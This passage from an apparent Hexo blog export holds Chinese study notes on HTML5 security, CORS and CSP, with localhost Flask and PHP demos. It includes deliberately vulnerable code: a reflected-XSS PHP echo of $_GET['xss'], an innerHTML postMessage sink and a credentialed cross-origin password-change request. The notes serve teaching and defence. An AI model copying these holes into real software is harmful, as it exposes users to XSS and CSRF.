class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更多可查看：<a href="http://html5sec.org/" target="_blank" rel="noopener">HTML5 标签安全</a></p></li></ul><h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>js的多线程支持为新的僵尸网络或挖矿脚本 提供机会：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br></pre></td></tr></table></figure><h3 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h3><p>postmessage可能会导致新的XSS攻击：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br><span class="line">worker.postMessage(<span class="string">"hello world"</span>);</span><br><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).innerHTML = e.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>HTTP, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></li><li>Whitepaper: HTTP Security Headers and How They Work, <a href="https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader" target="_blank" rel="noopener">https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader</a></li><li>HSTS详解，<a href="https://www.jianshu.com/p/caa80c7ad45c" target="_blank" rel="noopener">https://www.jianshu.com/p/caa80c7ad45c</a></li><li>HTML5 安全问题解析, <a href="https://segmentfault.com/a/1190000003756563" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003756563</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> 协议安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP的访问控制与跨域资源共享（CORS）</title>
      <link href="/HTTP-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/HTTP-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首次发表在Freebuf：<a href="https://www.freebuf.com/articles/web/195925.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195925.html</a></strong></p><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>准确的说，同源策略是指，浏览器内部在发起如下请求时，该来源必须是当前同源的HTTP资源：</p><ol><li>以跨站点的方式调用XMLHttpRequest或者Fetch API。</li><li>Web字体（用于CSS中@ font-face的跨域字体使用）</li><li>WebGL textures</li><li>使用drawImage绘制到canvas的图像/视频帧。</li><li>样式表（用于CSSOM访问）</li></ol><a id="more"></a><p>注意：两个URI同源当且仅当它们的<code>协议://host:port</code>相同。</p><p>从第一点可以看到，浏览器限制从<strong>脚本内部</strong>发起跨域的HTTP请求——更准确的说，同源策略有的限制有两种表现：（1）限制发起AJAX请求(XMLHttpRequest，Fetch)；（2）拦截其他跨站请求的返回结果；这取决于请求是否为简单请求。</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>跨域资源共享（Cross-Origin Resource Sharing, CORS）是一种解决跨域请求的方案，其机制是使用一组额外响应头（Access-Control-Allow-Origin）和预检请求(OPTIONS)来使浏览器有权使用非同源资源。大部分的现代浏览器符合该标准。</p><h1 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h1><p>若请求满足所有下述条件，则该请求可视为“简单请求”：</p><ul><li><p>使用下列方法之一：</p><ul><li>GET</li><li>HEAD</li><li>POST</li></ul></li><li><p>并且<code>Content-Type</code>的值仅限于下列三者之一：</p><ul><li>text/plain</li><li>multipart/form-data</li><li>application/x-www-form-urlencoded</li></ul></li><li><p>Fetch 规范定义了对 CORS 安全的首部字段集合，也就是说，不得手动设置除以下集合之外的字段（否则不为简单请求）。该集合为：</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type</li><li>DPR</li><li>Downlink</li><li>Save-Data</li><li>Viewport-Width</li><li>Width</li></ul></li><li><p>并且请求中的任意<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> 对象均没有注册任何事件监听器；<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> 对象可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload" target="_blank" rel="noopener"><code>XMLHttpRequest.upload</code></a> 属性访问。</p></li><li><p>并且请求中没有使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream" target="_blank" rel="noopener"><code>ReadableStream</code></a> 对象。</p></li></ul><p>简单请求会直接发送请求而不会触发预请求，但是不一定能拿到结果，这取决于请求的服务器Response的<code>Access-Control-Allow-Origin</code>内容。注意以上条件只要有一条不满足则不为简单请求。</p><h2 id="简单请求跨域表现"><a href="#简单请求跨域表现" class="headerlink" title="简单请求跨域表现"></a>简单请求跨域表现</h2><p>发起请求服务<a href="http://127.0.0.1:8000/ajax.html：" target="_blank" rel="noopener">http://127.0.0.1:8000/ajax.html：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:8888/get"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"submitRequest()"</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非同源服务<a href="http://127.0.0.1:8888/：" target="_blank" rel="noopener">http://127.0.0.1:8888/：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">'random_secret_key'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Privilege..."</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.args.get(<span class="string">"user"</span>, <span class="string">"Null"</span>)</span><br><span class="line">    session[<span class="string">"user"</span>]=user</span><br><span class="line">    template=<span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, user=user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>发请求，可以看到请求确实已发送，并且可以带cookie（withCredentials），但是js没有拿到结果：</p><p>AJAX请求结果（请求成功，回传失败，所以这也是GET型CSRF无法很好防范的原因）：</p><p><img src="/HTTP-跨域资源共享CORS学习笔记/1548854666171.png" alt="1548854666171"></p><p>综上，对于简单跨域请求，若未正确配置则请求正常发送，不能获取返回结果（浏览器拦截）。</p><h2 id="Origin和Access-Control-Allow-Origin"><a href="#Origin和Access-Control-Allow-Origin" class="headerlink" title="Origin和Access-Control-Allow-Origin"></a>Origin和Access-Control-Allow-Origin</h2><p>可以看到在请求中存在Origin字段，它标记了来源，对应的Access-Control-Allow-Origin为回应包头携带字段，它表示那些来源可以访问本域，<code>*</code>表示所有来源（注意它不能与credentials一起使用）。</p><p>使用CORS实现的支持跨域的非同源服务<a href="http://127.0.0.1:8888/：" target="_blank" rel="noopener">http://127.0.0.1:8888/：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        ret = <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">"No Privilege..."</span></span><br><span class="line">    resp=make_response(ret)</span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">"http://127.0.0.1:8000"</span></span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Credentials'</span>] = <span class="string">'true'</span></span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Methods'</span>] = <span class="string">"POST, GET, OPTIONS, PUT, DELETE, PATCH"</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>其中还有几个header：</p><ul><li>Access-Control-Allow-Credentials：如果请求需要带cookie，该header必须为true，同时<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，否则同样拿不到结果；</li><li>Access-Control-Allow-Methods：允许的请求方式</li></ul><p><code>Origin</code>和<code>Access-Control-Allow-Origin</code>一个为请求携带的字段，一个为回应携带的字段，浏览器以此来判断js是否可以接收回应。</p><p>改造后前端终于能够拿到结果：</p><p><img src="/HTTP-跨域资源共享CORS学习笔记/1548855646635.png" alt="1548855646635"></p><h1 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h1><p>若请求不为简单请求，那么在发起该请求前必须使用OPTIONS发送预验请求，服务器允许后才能发送实际请求（可以猜想这是为了防止CSRF）。</p><p>当请求满足一下任一条件时，该请求为非简单请求：</p><ul><li>使用了下面任一 HTTP 方法：<ul><li>PUT</li><li>DELETE</li><li>CONNECT</li><li>OPTIONS</li><li>TRACE</li><li>PATCH</li></ul></li><li>人为设置了对 CORS 安全的首部字段集合 之外的其他首部字段。</li><li><code>Content-Type</code>的值不属于下列之一:<ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li>请求中的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> 对象注册了任意多个事件监听器。</li><li>请求中使用了<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream" target="_blank" rel="noopener"><code>ReadableStream</code></a>对象。</li></ul><h2 id="预检请求跨域表现"><a href="#预检请求跨域表现" class="headerlink" title="预检请求跨域表现"></a>预检请求跨域表现</h2><p>假设有服务器<a href="http://127.0.0.1:8888/json：" target="_blank" rel="noopener">http://127.0.0.1:8888/json：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'json.html'</span>, Evil=<span class="string">"Benign"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"session:"</span>,session)</span><br><span class="line">            data=request.json</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        print(ret)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">'result'</span>: ret&#125;)</span><br></pre></td></tr></table></figure><p>‘templates/json.html’内容为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; Evil &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> Reset Password <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"POST"</span>, <span class="string">"http://127.0.0.1:8888/json"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"*/*"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json; charset=utf-8"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"action"</span>:<span class="string">"change passwd..."</span>&#125;));</span></span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"submitRequest()"</span>&gt;</span>Conform<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同域不存在预检请求：</p><p><img src="/HTTP-跨域资源共享CORS学习笔记/1548918853746.png" alt="1548918853746"></p><p>跨域出现OPTIONS请求，默认情况下跨域被阻止：</p><p><img src="/HTTP-跨域资源共享CORS学习笔记/1548920449712.png" alt="1548920449712"></p><p><code>Access-Control-Request-Method:</code>字段说明请求的操作</p><h2 id="允许跨域请求"><a href="#允许跨域请求" class="headerlink" title="允许跨域请求"></a>允许跨域请求</h2><p>在OPTIONS和POST报头加入<code>Access-Control-Allow-Origin</code>等字段<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST','OPTIONS'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'json.html'</span>, Evil=<span class="string">"Benign"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"session:"</span>,session)</span><br><span class="line">            data=request.json</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        resp=make_response(jsonify(&#123;<span class="string">'result'</span>: ret&#125;))</span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">"http://127.0.0.1:8000"</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Credentials'</span>] = <span class="string">'true'</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Methods'</span>] = <span class="string">"POST, GET, OPTIONS, PUT, DELETE, PATCH"</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Headers'</span>] = <span class="string">"origin, content-type, accept, x-requested-with"</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><p>跨站成功，先发送OPTIONS，再发送POST，注意这两个报头必须都存在CORS字段。</p><p><img src="/HTTP-跨域资源共享CORS学习笔记/1548922726229.png" alt="1548922726229"></p><h1 id="与CORS有关的HTTP头"><a href="#与CORS有关的HTTP头" class="headerlink" title="与CORS有关的HTTP头"></a>与CORS有关的HTTP头</h1><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><ul><li><code>Origin：&lt;origin&gt;</code>：表示实际请求的源站</li><li><code>Access-Control-Request-Method: &lt;method&gt;</code>：用于预检请求，表示真实的请求方法。</li><li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code>：用于预检请求，表示真实请求所携带的首部字段（从抓包上来看chrome没有按要求来啊Orz）</li></ul><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><ul><li><code>Access-Control-Allow-Origin: &lt;origin&gt; | *</code>：允许外域URI</li><li><code>Access-Control-Allow-Credentials：false</code>：是否允许浏览器读取response内容（如cookie）</li><li><code>Access-Control-Allow-Methods</code>：用于预检请求响应，表示允许使用的HTTP方法</li><li><code>Access-Control-Allow-Headers</code>：用于预检请求响应，表示允许携带的头部</li><li><code>Access-Control-Expose-Headers</code>：允许响应时能获取的其他头部（在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头）</li><li><code>Access-Control-Max-Age</code>：preflight请求的最大响应时间</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>Cross-Origin Resource Sharing（CORS）详解，CORS详解，CORS原理分析，<a href="https://www.cnblogs.com/demingblog/p/8393511.html" target="_blank" rel="noopener">https://www.cnblogs.com/demingblog/p/8393511.html</a></li><li>HTTP访问控制（CORS），<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CORS </tag>
            
            <tag> 跨域，HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内容安全策略CSP学习笔记</title>
      <link href="/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>内容安全策略   (CSP) 是一个额外的安全层，用于允许站点的管理者控制页面上哪些资源能够被用户代理程序加载。以阻止包括跨站脚本 (XSS) 、数据注入等攻击。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="在HTTP头部指定策略"><a href="#在HTTP头部指定策略" class="headerlink" title="在HTTP头部指定策略"></a>在HTTP头部指定策略</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: policy</span><br></pre></td></tr></table></figure><h2 id="使用meta标签指定策略"><a href="#使用meta标签指定策略" class="headerlink" title="使用meta标签指定策略"></a>使用meta标签指定策略</h2><a id="more"></a><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-security-policy"</span> <span class="attr">content</span>=<span class="string">"policy"</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="存在漏洞的服务器"><a href="#存在漏洞的服务器" class="headerlink" title="存在漏洞的服务器"></a>存在漏洞的服务器</h2><p>写一个反射式的XSS服务吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script src=&quot;/js/benign.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>bengin.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm benign~~~"</span>);</span><br></pre></td></tr></table></figure><p>evil.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm evil!"</span>);</span><br></pre></td></tr></table></figure><p>毫无疑问它是存在漏洞的，不过无奈现在chrome的反射型xss防御做的太好了，我们只能先暂时关闭它(j加header)来降低实验难度，在BP里面加一个”X-XSS-Protection:0”的Header：</p><p><img src="/HTTP-内容安全策略CSP学习笔记/1548835133910.png" alt="1548835133910"></p><p>我在8000端口又起了一个http服务，接着随心所欲的XSS：</p><p><img src="/HTTP-内容安全策略CSP学习笔记/1548835338494.png" alt="1548835338494"></p><h2 id="应用默认策略"><a href="#应用默认策略" class="headerlink" title="应用默认策略"></a>应用默认策略</h2><p>配置该站点的内容均来自同源：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'</span><br></pre></td></tr></table></figure><p>其中，<code>default-src</code>是指若其他元素来源的规则（如<code>script-src</code>，<code>img-src</code>）没有设置的情况下，默认使用<code>default-src</code>的配置，<code>self</code>是同源。</p><p>设置后可以看到xss被拦截，以为恶意脚本来自不同的源：</p><p><img src="/HTTP-内容安全策略CSP学习笔记/1548835861387.png" alt="1548835861387"></p><h2 id="信任多个域名"><a href="#信任多个域名" class="headerlink" title="信任多个域名"></a>信任多个域名</h2><p>元素的可信来源可以有多个，比如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' *.trusted.com</span><br></pre></td></tr></table></figure><h2 id="来源配置"><a href="#来源配置" class="headerlink" title="来源配置"></a>来源配置</h2><ul><li><code>*</code>： 允许所有</li><li><code>none</code>：禁止加载任何路径的资源</li><li><code>self</code>：允许加载同源的资源</li><li><code>data:</code>：允许通过数据模式加载资源</li><li><code>domain.ccc.com</code>：允许加载匹配域名的资源</li><li><code>*.ccc.com</code>：允许加载匹配域名的资源</li><li><code>https://img.ccc.com</code>：允许加载https方式的域名资源</li><li><code>unsafe-inline</code>：允许使用内联元素</li><li><code>unsafe-eval</code>：允许执行eval函数</li></ul><h2 id="精确控制"><a href="#精确控制" 